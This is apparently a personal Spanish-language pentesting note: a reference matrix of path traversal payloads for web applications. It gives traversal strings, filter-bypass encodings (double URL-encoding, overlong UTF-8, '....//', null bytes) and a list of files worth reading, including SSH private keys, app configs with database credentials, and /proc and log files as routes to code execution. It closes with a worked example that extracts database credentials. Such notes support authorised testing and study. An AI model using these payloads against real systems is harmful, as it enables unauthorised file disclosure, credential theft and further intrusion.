---
tipo: meta
aliases:
  - Payloads path traversal
tags:
  - meta/referencia
  - dominio/web
---

# Path traversal - matriz de referencia

> [!info] Referencia pura, no un zettel
> Leer archivos fuera del directorio previsto. La base de LFI también. Criterio en [[LFI - inclusión local]]. `yi``  ` copia.

## 0. Confirmar

`../../../../etc/passwd`
El objetivo de prueba en Linux. Si sale el contenido de passwd, hay traversal.

`..\..\..\..\windows\win.ini`
Equivalente en Windows.

`/etc/passwd`
Path absoluto: probar primero, a veces la app no exige `../`.

## 1. Ajustar la profundidad

`../etc/passwd` → `../../etc/passwd` → `../../../etc/passwd` ...
Ir sumando `../` hasta llegar a la raíz. De más no molesta: `../` en la raíz se ignora, así que tirar muchos (`../../../../../../`) es seguro.

## 2. Bypass de filtros de `../`

`....//....//....//etc/passwd`
Si el filtro borra `../` **una vez** sin repetir: `....//` → tras borrar `../` queda `../`.

`..%2f..%2f..%2fetc/passwd`
URL-encode del `/`. `%2e%2e%2f` codifica el `../` entero.

`..%252f..%252fetc/passwd`
Doble encode: el proxy decodifica a `%2f`, el server otra vez a `/`.

`..%c0%af..%c0%afetc/passwd`
Overlong UTF-8 del `/` — bypass en servidores viejos/mal configurados.

`....\/....\/etc/passwd`
Mezcla de separadores contra filtros que solo miran uno.

## 3. Extensión forzada

Cuando la app agrega `.php`/`.html` al final (`include($_GET['p'].'.php')`).

`../../../etc/passwd%00`
Null byte: trunca la extensión. Solo PHP < 5.3.4.

`../../../etc/passwd`  con  path que ya termina donde querés
En versiones modernas el null byte no va; se pasa a wrappers (`php://filter`) — ver [[LFI wrappers - matriz de referencia]].

## 4. Objetivos útiles (Linux)

`/etc/passwd`  usuarios del sistema
`/etc/hosts`  hosts internos
`/proc/self/environ`  variables de entorno del proceso (vía a RCE)
`/proc/self/cmdline`  cómo se lanzó el proceso
`/var/log/apache2/access.log`  log (vía a RCE por poisoning)
`/var/www/html/config.php`  config de la app — credenciales
`~/.ssh/id_rsa`  clave privada si el path es adivinable

## Ejemplo

```
1. ?file=/etc/passwd            → nada: exige formato relativo
2. ?file=../../../etc/passwd    → nada: filtran ../
3. ?file=..%252f..%252f..%252fetc/passwd  → root:x:0:0  → doble encode pasa
4. ?file=..%252f..%252f..%252fvar/www/html/config.php  → credenciales de la DB
```

## Relacionadas

[[LFI - inclusión local]] · [[MOC - File inclusion]] · [[LFI wrappers - matriz de referencia]]
